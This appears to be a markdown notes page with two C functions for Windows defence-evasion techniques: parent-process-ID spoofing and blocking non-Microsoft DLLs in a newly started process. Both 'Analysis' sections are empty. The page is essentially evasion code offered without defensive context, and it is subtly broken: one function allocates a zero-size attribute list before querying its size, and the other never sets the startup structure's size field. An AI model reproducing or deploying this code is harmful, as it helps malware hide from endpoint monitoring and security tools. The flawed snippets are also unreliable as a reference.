## PPID Spoofing

### Code
```c
void PPIDSpoof(int pid, char * procName) {
    SIZE_T attrSize = 0; 
    STARTUPINFOEXA suInfo;
    PROCESS_INFORMATION procInfo;

    RtlZeroMemory(&suInfo, sizeof(STARTUPINFOEXA));
    RtlZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));

    suInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);

    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    InitializeProcThreadAttributeList(suInfo.lpAttributeList, 1, 0, &attrSize);

    HANDLE hProc = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid);
    UpdateProcThreadAttribute(suInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProc, sizeof(HANDLE), NULL, NULL);
    suInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    CreateProcessA(NULL, (LPSTR)procName, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &suInfo.StartupInfo, &procInfo);
}
```

### Analysis


## BlockDLLs

### Code
```c
void BlockDLL(char * procName){
  
  SIZE_T attrSize = 0; 
  STARTUPINFOEXA suInfo;
  PROCESS_INFORMATION procInfo;
  PPROC_THREAD_ATTRIBUTE_LIST attrList;

  RtlZeroMemory(&suInfo, sizeof(STARTUPINFOEXA));
  RtlZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));
  RtlZeroMemory(&attrList, sizeof(PPROC_THREAD_ATTRIBUTE_LIST));

  InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
	attrList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
	InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize);

	DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
	UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
	suInfo.lpAttributeList = attrList;

	CreateProcessA(NULL, (LPSTR)procName, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &suInfo.StartupInfo, &procInfo);
	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, attrList);    
}
```

### Analysis
